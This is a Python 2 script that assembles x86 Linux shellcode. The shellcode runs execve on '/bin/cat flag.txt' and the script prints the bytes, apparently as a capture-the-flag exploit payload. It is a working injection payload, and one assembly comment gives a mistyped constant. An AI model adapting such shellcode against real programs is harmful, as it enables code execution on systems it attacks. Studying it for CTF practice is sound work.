s = ''
s += "\x31\xc0"					# xorl %eax,%eax
s += "\x99" 					# cdq
s += "\x52" 					# push edx
s += "\x68\x2f\x63\x61\x74" 	# push dword 0x7461632f
s += "\x68\x2f\x62\x69\x6e" 	# push dword 0x6e69622f
s += "\x89\xe3" 				# mov ebx,esp
s += "\x52" 					# push edx
s += "\x68\x2e\x74\x78\x74" 	# push dword 0x7487742e
s += "\x68\x66\x6c\x61\x67"		# push dword 0x67616c66
s += "\x89\xe1" 				# mov ecx,esp
s += "\xb0\x0b" 				# mov $0xb,%al
s += "\x52" 					# push edx
s += "\x51" 					# push ecx
s += "\x53" 					# push ebx
s += "\x89\xe1" 				# mov ecx,esp
s += "\xcd\x80" 				# int 80h

print s
